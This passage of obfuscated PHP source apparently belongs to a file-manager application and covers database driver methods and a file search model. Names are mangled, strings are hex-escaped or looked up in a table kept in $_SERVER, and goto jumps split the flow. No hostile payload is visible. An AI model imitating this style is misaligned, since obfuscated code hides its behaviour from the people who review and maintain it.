1\11\101\x4e\104\40\x74\x2e\x74\141\x62\154\x65\137\156\141\x6d\145\40\75\40\143\x2e\x74\x61\142\154\x65\137\156\141\155\x65\12\x9\x9\x57\110\105\x52\x45\x20\40\x20\164\56\x74\x61\x62\154\145\x5f\x6e\141\155\x65\40\x3d\40\47{$¸óì²Š¢}\x27"; break; case $¦Ã Å¿[997]: $ËÅçş¬» = $¦Ã Å¿[998] . $¸óì²Š¢ . $¦Ã Å¿[999]; break; case $¦Ã Å¿[979]: case $¦Ã Å¿[981]: $ËÅçş¬» = $¦Ã Å¿[1000] . $¦Ã Å¿[1001] . $¦Ã Å¿[1002] . strtoupper($¸óì²Š¢) . $¦Ã Å¿[1003] . strtoupper($¸óì²Š¢) . $¦Ã Å¿[1004]; break; case $¦Ã Å¿[1005]: $ËÅçş¬» = $¦Ã Å¿[1006] . $¸óì²Š¢ . $¦Ã Å¿[1007]; break; case $¦Ã Å¿[980]: break; case $¦Ã Å¿[1008]: default: $ËÅçş¬» = $¦Ã Å¿[1009] . ($this->dbType == $¦Ã Å¿[1008] ? "\x60{$¸óì²Š¢}\x60" : $¸óì²Š¢); } } $’ª‚ï‰Ä = $this->query($ËÅçş¬»); $óÊÛ±Ëİ = array(); if ($’ª‚ï‰Ä) { foreach ($’ª‚ï‰Ä as $ÙÃÎâÏÒ => $ûÄñÊî) { $ûÄñÊî = array_change_key_case($ûÄñÊî); $ûÄñÊî[$¦Ã Å¿[42]] = isset($ûÄñÊî[$¦Ã Å¿[42]]) ? $ûÄñÊî[$¦Ã Å¿[42]] : $¦Ã Å¿[430]; $ûÄñÊî[$¦Ã Å¿[43]] = isset($ûÄñÊî[$¦Ã Å¿[43]]) ? $ûÄñÊî[$¦Ã Å¿[43]] : $¦Ã Å¿[430]; $‡â™Ğ’ã = isset($ûÄñÊî[$¦Ã Å¿[325]]) ? $ûÄñÊî[$¦Ã Å¿[325]] : $ûÄñÊî[$¦Ã Å¿[42]]; $óÊÛ±Ëİ[$‡â™Ğ’ã] = array($¦Ã Å¿[42] => $‡â™Ğ’ã, $¦Ã Å¿[43] => $ûÄñÊî[$¦Ã Å¿[43]], $¦Ã Å¿[45] => (bool) (isset($ûÄñÊî[$¦Ã Å¿[113]]) && $ûÄñÊî[$¦Ã Å¿[113]] === $¦Ã Å¿[12] || isset($ûÄñÊî[$¦Ã Å¿[45]]) && $ûÄñÊî[$¦Ã Å¿[45]] === $¦Ã Å¿[12]), $¦Ã Å¿[47] => isset($ûÄñÊî[$¦Ã Å¿[47]]) ? $ûÄñÊî[$¦Ã Å¿[47]] : (isset($ûÄñÊî[$¦Ã Å¿[66]]) ? $ûÄñÊî[$¦Ã Å¿[66]] : $¦Ã Å¿[430]), $¦Ã Å¿[49] => isset($ûÄñÊî[$¦Ã Å¿[104]]) ? strtolower($ûÄñÊî[$¦Ã Å¿[104]]) == $¦Ã Å¿[51] : (isset($ûÄñÊî[$¦Ã Å¿[67]]) ? $ûÄñÊî[$¦Ã Å¿[67]] : !1), $¦Ã Å¿[52] => isset($ûÄñÊî[$¦Ã Å¿[1010]]) ? strtolower($ûÄñÊî[$¦Ã Å¿[1010]]) == $¦Ã Å¿[54] : (isset($ûÄñÊî[$¦Ã Å¿[104]]) ? $ûÄñÊî[$¦Ã Å¿[104]] : !1)); } } return $óÊÛ±Ëİ; } public function getTables($ÉÎšáÄÎ = '') { $ÚŠÏÖÖÕ =& $_SERVER[ˆûùúÊ¯]; if (think_config($ÚŠÏÖÖÕ[1011])) { $¼¨Çç©Ğ = str_replace($ÚŠÏÖÖÕ[1012], $ÉÎšáÄÎ, think_config($ÚŠÏÖÖÕ[1011])); } else { switch ($this->dbType) { case $ÚŠÏÖÖÕ[979]: case $ÚŠÏÖÖÕ[981]: $¼¨Çç©Ğ = $ÚŠÏÖÖÕ[1013]; break; case $ÚŠÏÖÖÕ[978]: case $ÚŠÏÖÖÕ[996]: $¼¨Çç©Ğ = $ÚŠÏÖÖÕ[1014]; break; case $ÚŠÏÖÖÕ[1005]: $¼¨Çç©Ğ = $ÚŠÏÖÖÕ[1015]; break; case $ÚŠÏÖÖÕ[980]: think_exception(think_lang($ÚŠÏÖÖÕ[1016]) . $ÚŠÏÖÖÕ[1017]); break; case $ÚŠÏÖÖÕ[997]: $¼¨Çç©Ğ = $ÚŠÏÖÖÕ[55] . $ÚŠÏÖÖÕ[56] . $ÚŠÏÖÖÕ[57]; break; case $ÚŠÏÖÖÕ[1008]: default: if (!empty($ÉÎšáÄÎ)) { $¼¨Çç©Ğ = $ÚŠÏÖÖÕ[960] . $ÉÎšáÄÎ . $ÚŠÏÖÖÕ[961]; } else { $¼¨Çç©Ğ = $ÚŠÏÖÖÕ[962]; } } } $ıÙÓ‹§Œ = $this->query($¼¨Çç©Ğ); $áâù™ª = array(); foreach ($ıÙÓ‹§Œ as $†—”„ä => $ÄŸ¸ÙÙé) { $áâù™ª[$†—”„ä] = current($ÄŸ¸ÙÙé); } return $áâù™ª; } protected function parseLimit($ç’éõÃù) { $‰äÌ«Ğß =& $_SERVER[ˆûùúÊ¯]; $ØËËÌÅÛ = $‰äÌ«Ğß[12]; if (!empty($ç’éõÃù)) { switch ($this->dbType) { case $‰äÌ«Ğß[1005]: case $‰äÌ«Ğß[997]: $ç’éõÃù = explode($‰äÌ«Ğß[60], $ç’éõÃù); if (count($ç’éõÃù) > 1) { $ØËËÌÅÛ .= $‰äÌ«Ğß[61] . $ç’éõÃù[1] . $‰äÌ«Ğß[62] . $ç’éõÃù[0] . $‰äÌ«Ğß[63]; } else { $ØËËÌÅÛ .= $‰äÌ«Ğß[61] . $ç’éõÃù[0] . $‰äÌ«Ğß[63]; } break; case $‰äÌ«Ğß[978]: case $‰äÌ«Ğß[996]: break; case $‰äÌ«Ğß[980]: break; case $‰äÌ«Ğß[979]: case $‰äÌ«Ğß[981]: break; case $‰äÌ«Ğß[1008]: default: $ØËËÌÅÛ .= $‰äÌ«Ğß[61] . $ç’éõÃù . $‰äÌ«Ğß[63]; } } return $ØËËÌÅÛ; } public function parseKey(&$Èå‚ªÖÆ, $ŞÅÀ­öª = true) { $í”¢Ìòë =& $_SERVER[ˆûùúÊ¯]; if ($ŞÅÀ­öª) { $Èå‚ªÖÆ = $this->parseKeyCheck($Èå‚ªÖÆ); } if ($this->dbType == $í”¢Ìòë[1008]) { if ($Èå‚ªÖÆ != $í”¢Ìòë[212] && !preg_match($í”¢Ìòë[972], $Èå‚ªÖÆ)) { $Èå‚ªÖÆ = $í”¢Ìòë[437] . trim($Èå‚ªÖÆ, $í”¢Ìòë[437]) . $í”¢Ìòë[437]; } return $Èå‚ªÖÆ; } else { return parent::parseKey($Èå‚ªÖÆ, $ŞÅÀ­öª); } } public function close() { $this->_linkID = null; } public function error() { $‚£½î³³ =& $_SERVER[ˆûùúÊ¯]; if ($this->PDOStatement) { $ï¯ìöƒï = $this->PDOStatement->errorInfo(); $this->error = $ï¯ìöƒï[1] . $‚£½î³³[4] . $ï¯ìöƒï[2]; } else { $this->error = $‚£½î³³[12]; } if ($‚£½î³³[12] != $this->queryStr) { $this->error .= LNG($‚£½î³³[58]) . $this->queryStr; } think_trace($this->error, $‚£½î³³[12], $‚£½î³³[59]); return $this->error; } public function escapeString($«ÏúŠº) { $ÀõÀ®¼ =& $_SERVER[ˆûùúÊ¯]; switch ($this->dbType) { case $ÀõÀ®¼[1005]: case $ÀõÀ®¼[978]: case $ÀõÀ®¼[996]: case $ÀõÀ®¼[1008]: return addslashes($«ÏúŠº); case $ÀõÀ®¼[980]: case $ÀõÀ®¼[997]: case $ÀõÀ®¼[979]: case $ÀõÀ®¼[981]: return str_ireplace($ÀõÀ®¼[68], $ÀõÀ®¼[69], $«ÏúŠº); } } protected function parseValue($­‡°»¤) { $²”Œú‡ =& $_SERVER[ˆûùúÊ¯]; if (is_string($­‡°»¤)) { $—ÕÏ°Ã„ = strpos($­‡°»¤, $²”Œú‡[4]) === 0 && in_array($­‡°»¤, array_keys($this->bind)); $­‡°»¤ = $—ÕÏ°Ã„ ? $this->escapeString($­‡°»¤) : $²”Œú‡[1018] . $this->escapeString($­‡°»¤) . $²”Œú‡[1018]; } elseif (isset($­‡°»¤[0]) && is_string($­‡°»¤[0]) && strtolower($­‡°»¤[0]) == $²”Œú‡[349]) { $­‡°»¤ = $this->escapeString($­‡°»¤[1]); } elseif (is_array($­‡°»¤)) { $­‡°»¤ = array_map(array($this, $²”Œú‡[1019]), $­‡°»¤); } elseif (is_bool($­‡°»¤)) { $­‡°»¤ = $­‡°»¤ ? $²”Œú‡[98] : $²”Œú‡[221]; } elseif (is_null($­‡°»¤)) { $­‡°»¤ = $²”Œú‡[113]; } return $­‡°»¤; } public function getLastInsertId() { $™µôæÃ =& $_SERVER[ˆûùúÊ¯]; switch ($this->dbType) { case $™µôæÃ[1005]: case $™µôæÃ[997]: case $™µôæÃ[978]: case $™µôæÃ[996]: case $™µôæÃ[980]: case $™µôæÃ[1008]: return $this->_linkID->lastInsertId(); case $™µôæÃ[979]: case $™µôæÃ[981]: $¯Å·æ¡ = $this->table; $œô¥Õ± = $this->query("\x53\105\x4c\x45\x43\x54\x20{$¯Å·æ¡}\56\143\x75\162\x72\x76\x61\154\x20\143\x75\162\162\166\141\154\x20\x46\122\117\115\40\144\165\x61\x6c"); return $œô¥Õ± ? $œô¥Õ±[0][$™µôæÃ[1020]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($²ù“»ª) { $ê¹ÅÀñÈ =& $_SERVER[ˆûùúÊ¯]; if (!CacheLock::fileLock($ê¹ÅÀñÈ[23])) { return !1; } $…´ã¥š = parent::query($²ù“»ª); CacheLock::fileUnLock($ê¹ÅÀñÈ[23]); return $…´ã¥š; } public function execute($…Úá¾©Ç) { $äìĞúËÊ =& $_SERVER[ˆûùúÊ¯]; if (!CacheLock::fileLock($äìĞúËÊ[23])) { return !1; } $şåöïü— = parent::execute($…Úá¾©Ç); CacheLock::fileUnLock($äìĞúËÊ[23]); return $şåöïü—; } } goto cå»ÁàÃ†; BÌ½·ñÌ²É: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ä“äÌ¯ã) { $Ö€ñšÀ‚ =& $_SERVER[ˆûùúÊ¯]; $äí¶óÕ¡ = KodIO::fileTypeList(); $êÙÈ”Øİ = $äí¶óÕ¡[$ä“äÌ¯ã]; if (!$êÙÈ”Øİ) { return array(); } $©Œ©Ëš = $êÙÈ”Øİ[$Ö€ñšÀ‚[184]]; $ÕÒÕÉ© = $Ö€ñšÀ‚[7]; if (!$êÙÈ”Øİ[$Ö€ñšÀ‚[184]]) { $”â¨É¬‘ = array_to_keyvalue($äí¶óÕ¡, $Ö€ñšÀ‚[12], $Ö€ñšÀ‚[184]); $©Œ©Ëš = implode($Ö€ñšÀ‚[60], $”â¨É¬‘); $ÕÒÕÉ© = $Ö€ñšÀ‚[2152]; } $¢û«¿°¡ = explode($Ö€ñšÀ‚[60], trim($©Œ©Ëš, $Ö€ñšÀ‚[60])); return array($ÕÒÕÉ©, $¢û«¿°¡); } public function listPathType($ñ°½À‹ó) { $÷¨ã =& $_SERVER[ˆûùúÊ¯]; $Ï‹€Ğ¤ã = $this->fileTypeWhere($ñ°½À‹ó); if (!$Ï‹€Ğ¤ã) { return array(); } $“­Å„È™ = USER_ID; $×ÃàáÄì = Model($÷¨ã[575])->getInfo($“­Å„È™); $­†­€Ô­ = array($÷¨ã[624] => SourceModel::TYPE_USER, $÷¨ã[561] => array($÷¨ã[588], $÷¨ã[571] . $×ÃàáÄì[$÷¨ã[97]][$÷¨ã[190]] . $÷¨ã[589]), $÷¨ã[625] => $“­Å„È™, $÷¨ã[622] => 0, $÷¨ã[623] => $Ï‹€Ğ¤ã); return $this->listSource($­†­€Ô­); } public function listSearch($‚•†Ù€¤, $Õ¸®ë”Š = 300) { $»ë¡îàÜ =& $_SERVER[ˆûùúÊ¯]; if (isset($‚•†Ù€¤[$»ë¡îàÜ[1990]]) && $‚•†Ù€¤[$»ë¡îàÜ[1990]]) { $‚•†Ù€¤[$»ë¡îàÜ[1990]] = str_replace($»ë¡îàÜ[436], $»ë¡îàÜ[2153], trim($‚•†Ù€¤[$»ë¡îàÜ[1990]])); } $Û…çÈÇ = $this->_parseSearchWhere($‚•†Ù€¤); if (!isset($Û…çÈÇ[$»ë¡îàÜ[481]])) { $Û…çÈÇ[$»ë¡îàÜ[481]] = 0; } $´­›ÀÏè = $»ë¡îàÜ[2154]; $ÉĞâùÎ˜ = $Û…çÈÇ; $ÁÉª¢®† = $´­›ÀÏè; $this->_listSearchBindPinyin($‚•†Ù€¤, $Û…çÈÇ, $´­›ÀÏè); $this->alias($»ë¡îàÜ[495])->_makeOrder(); $Û…çÈÇ = $this->parseWhereLike($Û…çÈÇ); $ˆ¤¼£Ø— = $this->distinct(!0)->field($´­›ÀÏè)->where($Û…çÈÇ)->selectPage($Õ¸®ë”Š); if ($GLOBALS[$»ë¡îàÜ[6]][$»ë¡îàÜ[433]][$»ë¡îàÜ[434]] && Input::check($‚•†Ù€¤[$»ë¡îàÜ[1990]], $»ë¡îàÜ[631]) && $ˆ¤¼£Ø—[$»ë¡îàÜ[418]][$»ë¡îàÜ[405]] == 1 && $ˆ¤¼£Ø—[$»ë¡îàÜ[418]][$»ë¡îàÜ[419]] == 0) { $ˆ¤¼£Ø— = $this->distinct(!0)->field($´­›ÀÏè)->where($ÉĞâùÎ˜)->limit(1000)->select(); $ˆ¤¼£Ø— = array_page_split($ˆ¤¼£Ø—, !1, $Õ¸®ë”Š); } $this->_listSearchFileContent($ˆ¤¼£Ø—, $‚•†Ù€¤, $ÁÉª¢®†, $ÉĞâùÎ˜); $this->_listSearchDesc($ˆ¤¼£Ø—, $‚•†Ù€¤, $ÁÉª¢®†); $this->_listSearchTag($ˆ¤¼£Ø—, $‚•†Ù€¤, $ÁÉª¢®†); $this->_listSearchGroupTag($ˆ¤¼£Ø—, $‚•†Ù€¤, $ÁÉª¢®†); $this->_listDataApply($ˆ¤¼£Ø—[$»ë¡îàÜ[421]]); $this->_listMake($ˆ¤¼£Ø—); return $ˆ¤¼£Ø—; } private function _listSearchFileContent(&$¿Õ¡‚š², $¬ÉÎ‚«, $¹ŒóŒ°, $‚‚¢½„ª) { $´Ù†Ö¼Á =& $_SERVER[ˆûùúÊ¯]; if (!$¬ÉÎ‚«[$´Ù†Ö¼Á[1990]] || $¿Õ¡‚š²[$´Ù†Ö¼Á[418]][$´Ù†Ö¼Á[405]] > 1) { return; } if (!isset($‚‚¢½„ª[$´Ù†Ö¼Á[42]]) || !is_array($¬ÉÎ‚«[$´Ù†Ö¼Á[517]])) { return; } $‚‚¢½„ª[$´Ù†Ö¼Á[517]] = array($´Ù†Ö¼Á[7], $¬ÉÎ‚«[$´Ù†Ö¼Á[517]]); unset($‚‚¢½„ª[$´Ù†Ö¼Á[42]]); unset($¬ÉÎ‚«[$´Ù†Ö¼Á[517]]); $»Ûò–® = $this->field($¹ŒóŒ°)->where($‚‚¢½„ª)->limit($´Ù†Ö¼Á[2155])->select(); if (!$»Ûò–® || count($»Ûò–®) == 0) { return; } $¿Õ¡‚š²[$´Ù†Ö¼Á[421]] = array_merge($»Ûò–®, $¿Õ¡‚š²[$´Ù†Ö¼Á[421]]); $¿Õ¡‚š²[$´Ù†Ö¼Á[418]][$´Ù†Ö¼Á[419]] += count($»Ûò–®); } private function _listSearchTag(&$ƒ•ã ªª, $Ú­§÷‡Ñ, $ï†±©³È) { $™ÎÒ±ëÃ =& $_SERVER[ˆûùúÊ¯]; if (!$Ú­§÷‡Ñ[$™ÎÒ±ëÃ[1990]] || $ƒ•ã ªª[$™ÎÒ±ëÃ[418]][$™ÎÒ±ëÃ[405]] > 1) { return; } $ÁÃ§Ì¢¤ = Model($™ÎÒ±ëÃ[2156])->listData(); $è»Ù¥ì = array(); $çÓ¾œæğ = $Ú­§÷‡Ñ[$™ÎÒ±ëÃ[1990]]; foreach ($ÁÃ§Ì¢¤ as $ “äò) { $Ğ±Ø¼·“ = $ “äò[$™ÎÒ±ëÃ[42]]; $áØû¨Š© = str_replace($™ÎÒ±ëÃ[63], $™ÎÒ±ëÃ[12], Pinyin::get($Ğ±Ø¼·“)); if (stripos($Ğ±Ø¼·“, $çÓ¾œæğ) !== !1 || stripos($áØû¨Š©, $çÓ¾œæğ) !== !1) { $è»Ù¥ì[] = $ “äò[$™ÎÒ±ëÃ[451]]; } } if (!$è»Ù¥ì) { return; } $åßÅÊ‹– = array($™ÎÒ±ëÃ[476] => array($™ÎÒ±ëÃ[7], $è»Ù¥ì), $™ÎÒ±ëÃ[1704] => USER_ID); $µÅôŞõğ = Model($™ÎÒ±ëÃ[478])->field($™ÎÒ±ëÃ[94])->where($åßÅÊ‹–)->select(); $µÅôŞõğ = array_to_keyvalue($µÅôŞõğ, $™ÎÒ±ëÃ[12], $™ÎÒ±ëÃ[94]); $Õè¯ÅÒ¶ = array_unique($µÅôŞõğ); $this->_listSearchMerge($ƒ•ã ªª, $Ú­§÷‡Ñ, $ï†±©³È, $Õè¯ÅÒ¶); } private function _listSearchDesc(&$ãÛˆç€Â, $¨ª’²êÉ, $Ê¦ÆîãÛ) { $¸¼ÈÜé™ =& $_SERVER[ˆûùúÊ¯]; if (!$¨ª’²êÉ[$¸¼ÈÜé™[1990]] || $ãÛˆç€Â[$¸¼ÈÜé™[418]][$¸¼ÈÜé™[405]] > 1) { return; } $ˆçÛÇ´Ô = array($¸¼ÈÜé™[104] => $¸¼ÈÜé™[502], $¸¼ÈÜé™[426] => array($¸¼ÈÜé™[435], $¸¼ÈÜé™[1992] . $¨ª’²êÉ[$¸¼ÈÜé™[1990]] . $¸¼ÈÜé™[1992])); $Ä ƒÏĞë = !1; if ($Ä ƒÏĞë) { $à•¿‡ = $this->listSearchChildren($¨ª’²êÉ[$¸¼ÈÜé™[189]]); $à•¿‡ = array_unique($à•¿‡); if (!$à•¿‡) { return; } $ˆçÛÇ´Ô[$¸¼ÈÜé™[190]] = array($¸¼ÈÜé™[7], $à•¿‡); } $Û¢ãÂ”ğ = Model($¸¼ÈÜé™[608])->field($¸¼ÈÜé™[190])->where($ˆçÛÇ´Ô)->limit(5000)->select(); $—¤‚ê´Ç = array_to_keyvalue($Û¢ãÂ”ğ, $¸¼ÈÜé™[12], $¸¼ÈÜé™[190]); $this->_listSearchMerge($ãÛˆç€Â, $¨ª’²êÉ, $Ê¦ÆîãÛ, $—¤‚ê´Ç); } private function _listSearchGroupTag(&$Ï“‚øŒØ, $²úº¥ûà, $Ë¼óä£Ä) { $¿¯±àˆ‘ =& $_SERVER[ˆûùúÊ¯]; if (!$²úº¥ûà[$¿¯±àˆ‘[1990]] || $Ï“‚øŒØ[$¿¯±àˆ‘[418]][$¿¯±àˆ‘[405]] > 1 || !$²úº¥ûà[$¿¯±àˆ‘[189]]) { return; } $öòàŒ× = $this->sourceInfo($²úº¥ûà[$¿¯±àˆ‘[189]]); if (!$öòàŒ× || $öòàŒ×[$¿¯±àˆ‘[187]] != SourceModel::TYPE_GROUP) { return; } $ôøËº¬ğ = $öòàŒ×[$¿¯±àˆ‘[546]]; $©É­ß±’ = Model($¿¯±àˆ‘[2157])->get($ôøËº¬ğ); $³°Âš‰é = array(); $©šş’Ù» = $²úº¥ûà[$¿¯±àˆ‘[1990]]; foreach ($©É­ß±’[$¿¯±àˆ‘[421]] as $şâğ úò) { $Ìæ®¡ÙÆ = $şâğ úò[$¿¯±àˆ‘[42]]; $Õ€¨Çúı = str_replace($¿¯±àˆ‘[63], $¿¯±àˆ‘[12], Pinyin::get($Ìæ®¡ÙÆ)); if (stripos($Ìæ®¡ÙÆ, $©šş’Ù») !== !1 || stripos($Õ€¨Çúı, $©šş’Ù») !== !1) { $³°Âš‰é[] = $şâğ úò[$¿¯±àˆ‘[451]]; } } if (!$³°Âš‰é) { return; } $àÊ‡¬ò = array($¿¯±àˆ‘[476] => array($¿¯±àˆ‘[7], $³°Âš‰é), $¿¯±àˆ‘[1704] => 0, $¿¯±àˆ‘[43] => $¿¯±àˆ‘[2012] . $ôøËº¬ğ); $° ®Ü¬ = Model($¿¯±àˆ‘[478])->field($¿¯±àˆ‘[94])->where($àÊ‡¬ò)->select(); $° ®Ü¬ = array_to_keyvalue($° ®Ü¬, $¿¯±àˆ‘[12], $¿¯±àˆ‘[94]); $»Ö³è§ = array_unique($° ®Ü¬); $this->_listSearchMerge($Ï“‚øŒØ, $²úº¥ûà, $Ë¼óä£Ä, $»Ö³è§); } private function _listSearchMerge(&$€âÅ™Õ, $áíÓ À, $º±íÚŒÖ, $ÉÉ…âœÑ) { $°ı·ûÌ• =& $_SERVER[ˆûùúÊ¯]; if (!$ÉÉ…âœÑ) { return; } $œ‰ü®¡Ç = array_to_keyvalue($€âÅ™Õ[$°ı·ûÌ•[421]], $°ı·ûÌ•[12], $°ı·ûÌ•[190]); $–å«²ä© = array_diff($ÉÉ…âœÑ, $œ‰ü®¡Ç); if (!$–å«²ä©) { return; } $ êƒè‡ = array($°ı·ûÌ•[190] => array($°ı·ûÌ•[7], $–å«²ä©)); $¯Ä§¢Éö = $this->field($º±íÚŒÖ)->where($ êƒè‡)->select(); if (!$¯Ä§¢Éö) { return; } $çÇñØ‹ = array(); foreach ($¯Ä§¢Éö as $±×Ùğì†) { if ($this->_listSearchFilter($±×Ùğì†, $áíÓ À)) { $çÇñØ‹[] = $±×Ùğì†; } } $€âÅ™Õ[$°ı·ûÌ•[421]] = array_merge($çÇñØ‹, $€âÅ™Õ[$°ı·ûÌ•[421]]); $€âÅ™Õ[$°ı·ûÌ•[418]][$°ı·ûÌ•[419]] += count($çÇñØ‹); } private function _listSearchFilter($˜®¥íï, $™¹‰÷Íè) { $“Ì»³’ú =& $_SERVER[ˆûùúÊ¯]; $Œò…ªï˜ = $˜®¥íï[$“Ì»³’ú[461]] == $“Ì»³’ú[98]; if (!strstr($˜®¥íï[$“Ì»³’ú[561]], $“Ì»³’ú[60] . $™¹‰÷Íè[$“Ì»³’ú[189]] . $“Ì»³’ú[60])) { return !1; } if (isset($™¹‰÷Íè[$“Ì»³’ú[462]]) && $™¹‰÷Íè[$“Ì»³’ú[462]] != $“Ì»³’ú[1951]) { if ($™¹‰÷Íè[$“Ì»³’ú[462]] == $“Ì»³’ú[85] && !$Œò…ªï˜) { return !1; } if ($™¹‰÷Íè[$“Ì»³’ú[462]] != $“Ì»³’ú[85] && $Œò…ªï˜) { return !1; } if (!strstr($˜®¥íï[$“Ì»³’ú[184]], $“Ì»³’ú[60] . $™¹‰÷Íè[$“Ì»³’ú[462]] . $“Ì»³’ú[60])) { return !1; } } if (isset($™¹‰÷Íè[$“Ì»³’ú[2158]]) && $™¹‰÷Íè[$“Ì»³’ú[2158]] < $˜®¥íï[$“Ì»³’ú[86]]) { return !1; } if (isset($™¹‰÷Íè[$“Ì»³’ú[2159]]) && $™¹‰÷Íè[$“Ì»³’ú[2159]] > $˜®¥íï[$“Ì»³’ú[86]]) { return !1; } if (isset($™¹‰÷Íè[$“Ì»³’ú[638]]) && $™¹‰÷Íè[$“Ì»³’ú[638]] != $˜®¥íï[$“Ì»³’ú[505]]) { return !1; } return !0; } public function listSearchChildren($ı¹¯Ò‰ù, $õ“ò‹òİ = 5000) { $¥´ËÄô =& $_SERVER[ˆûùúÊ¯]; $İ«ıÍæ„ = array(); $³ìéğƒ = $this->sourceInfo($ı¹¯Ò‰ù); $ı¿ø™Õá = array($¥´ËÄô[561] => array($¥´ËÄô[435], $³ìéğƒ[$¥´ËÄô[561]] . $³ìéğƒ[$¥´ËÄô[190]] . $¥´ËÄô[589])); $¹êØèÜÅ = $this->field($¥´ËÄô[86])->where($ı¿ø™Õá)->limit($õ“ò‹òİ + 1)->select(); $ë»ò¥”î = is_array($¹êØèÜÅ) ? count($¹êØèÜÅ) : 0; if ($ë»ò¥”î > $õ“ò‹òİ) { return $this->_listSearchChildrenNear($ı¹¯Ò‰ù, $õ“ò‹òİ); } $ÑéÚ¥õì = $this->field($¥´ËÄô[190])->where($ı¿ø™Õá)->select(); $İ«ıÍæ„ = array_to_keyvalue($ÑéÚ¥õì, $¥´ËÄô[12], $¥´ËÄô[190]); return $İ«ıÍæ„; } private function _listSearchChildrenNear($Í³î¡¨, $ßÒ¦Ö›») { $Ú•üµ ª =& $_SERVER[ˆûùúÊ¯]; $ø¡êÙÁ¼ = array(); $†Ÿ¼•ëÓ = array($Ú•üµ ª[189] => $Í³î¡¨); $òóßºæ = $this->field($Ú•üµ ª[2160])->where($†Ÿ¼•ëÓ)->select(); $ªìÓß¼‹ = array_to_keyvalue(array_filter_by_field($òóßºæ, $Ú•üµ ª[461], $Ú•üµ ª[98]), $Ú•üµ ª[12], $Ú•üµ ª[190]); $ø¡êÙÁ¼ = array_merge($ø¡êÙÁ¼, array_to_keyvalue($òóßºæ, $Ú•üµ ª[12], $Ú•üµ ª[190])); if (!$ªìÓß¼‹) { return $ø¡êÙÁ¼; } $†Ÿ¼•ëÓ = array($Ú•üµ ª[189] => array($Ú•üµ ª[7], $ªìÓß¼‹)); $òóßºæ = $this->field($Ú•üµ ª[2160])->where($†Ÿ¼•ëÓ)->limit($ßÒ¦Ö›»)->select(); $ø¡êÙÁ¼ = array_merge($ø¡êÙÁ¼, array_to_keyvalue($òóßºæ, $Ú•üµ ª[12], $Ú•üµ ª[190])); $ø¡êÙÁ¼ = array_slice($ø¡êÙÁ¼, 0, $ßÒ¦Ö›»); return $ø¡êÙÁ¼; } private function _listSearchBindPinyin($Ó±í‡ã¹, &$Ê¾ú¯Ş½, &$Ïî£„¥©) { $·õªÂã =& $_SERVER[ˆûùúÊ¯]; if (!isset($Ó±í‡ã¹[$·õªÂã[1990]]) || !$Ó±í‡ã¹[$·õªÂã[1990]]) { return; } if (!Input::check($Ó±í‡ã¹[$·õªÂã[1990]], $·õªÂã[370]) || strlen($Ó±í‡ã¹[$·õªÂã[1990]]) < 2) { return; } $µ‹¹€ş = "\x4c\x45\x46\124\x20\112\x4f\111\116\40{$this->tablePrefix}\x69\157\x5f\x73\157\x75\x72\x63\x65\x5f\155\x65\x74\x61\40\x6d\145\x74\141\40\157\x6e\40\x73\x6f\165\162\143\145\x2e\x73\157\165\x72\x63\145\x49\104\40\75\40\155\145\x74\x61\56\163\x6f\x75\162\143\145\111\x44"; $ğÜ°Ÿ¾‚ = array(); $Ïî£„¥© = str_replace(array($·õªÂã[18], $·õªÂã[63], $·õªÂã[2161]), $·õªÂã[12], $Ïî£„¥©); $Ïî£„¥© = $·õªÂã[487] . str_replace($·õªÂã[60], $·õªÂã[488], $Ïî£„¥©); $Èö…¹ñ§ = $Ê¾ú¯Ş½[$·õªÂã[42]]; unset($Ê¾ú¯Ş½[$·õªÂã[42]]); foreach ($Ê¾ú¯Ş½ as $–¤œÉÑ— => $á¥ÉµÀş) { $ğÜ°Ÿ¾‚[$·õªÂã[487] . $–¤œÉÑ—] = $á¥ÉµÀş; } foreach ($Èö…¹ñ§ as $îÜÆ«¡ä) { $ğÜ°Ÿ¾‚[] = array($·õªÂã[492] => $îÜÆ«¡ä, $·õªÂã[1061] => $·õªÂã[1994], array($·õªÂã[2162] => $îÜÆ«¡ä, $·õªÂã[2163] => array($·õªÂã[7], array($·õªÂã[514], $·õªÂã[513])))); } $this->join($µ‹¹€ş); $Ê¾ú¯Ş½ = $ğÜ°Ÿ¾‚; } private function _parseSearchWhere($©íÍâ) { $Ó©°Úœ® =& $_SERVER[ˆûùúÊ¯]; $”‚÷òùß = array(); if (isset($©íÍâ[$Ó©°Úœ®[820]]) && $©íÍâ[$Ó©°Úœ®[820]]) { $”‚÷òùß[$Ó©°Úœ®[95]] = array($Ó©°Úœ®[2164], $©íÍâ[$Ó©°Úœ®[820]]); } if (isset($©íÍâ[$Ó©°Úœ®[821]]) && $©íÍâ[$Ó©°Úœ®[821]]) { $Æ©½‰¨ = array($Ó©°Úœ®[2165], $©íÍâ[$Ó©°Úœ®[821]]); if ($”‚÷òùß[$Ó©°Úœ®[95]]) { $”‚÷òùß[$Ó©°Úœ®[95]] = array($”‚÷òùß[$Ó©°Úœ®[95]], $Æ©½‰¨, $Ó©°Úœ®[2166]); } else { $”‚÷òùß[$Ó©°Úœ®[95]] = $Æ©½‰¨; } } if (isset($©íÍâ[$Ó©°Úœ®[2158]]) && $©íÍâ[$Ó©°Úœ®[2158]] > 0) { $”‚÷òùß[$Ó©°Úœ®[86]] = array($Ó©°Úœ®[2164], $©íÍâ[$Ó©°Úœ®[2158]]); } if (isset($©íÍâ[$Ó©°Úœ®[2159]]) && $©íÍâ[$Ó©°Úœ®[2159]]) { $Æ©½‰¨ = array($Ó©°Úœ®[2165], $©íÍâ[$Ó©°Úœ®[2159]]); if ($”‚÷òùß[$Ó©°Úœ®[86]]) { $”‚÷òùß[$Ó©°Úœ®[86]] = array($”‚÷òùß[$Ó©°Úœ®[86]], $Æ©½‰¨, $Ó©°Úœ®[2166]); } else { $”‚÷òùß[$Ó©°Úœ®[86]] = $Æ©½‰¨; } } if (isset($©íÍâ[$Ó©°Úœ®[638]]) && $©íÍâ[$Ó©°Úœ®[638]]) { $”‚÷òùß[] = array($Ó©°Úœ®[505] => $©íÍâ[$Ó©°Úœ®[638]], $Ó©°Úœ®[503] => $©íÍâ[$Ó©°Úœ®[638]], $Ó©°Úœ®[1061] => $Ó©°Úœ®[1994]); } if (isset($©íÍâ[$Ó©°Úœ®[462]]) && $©íÍâ[$Ó©°Úœ®[462]]) { $ğÃ”ÁÈˆ = $©íÍâ[$Ó©°Úœ®[462]]; if ($ğÃ”ÁÈˆ == $Ó©°Úœ®[85]) { $”‚÷òùß[$Ó©°Úœ®[461]] = 1; } else { if 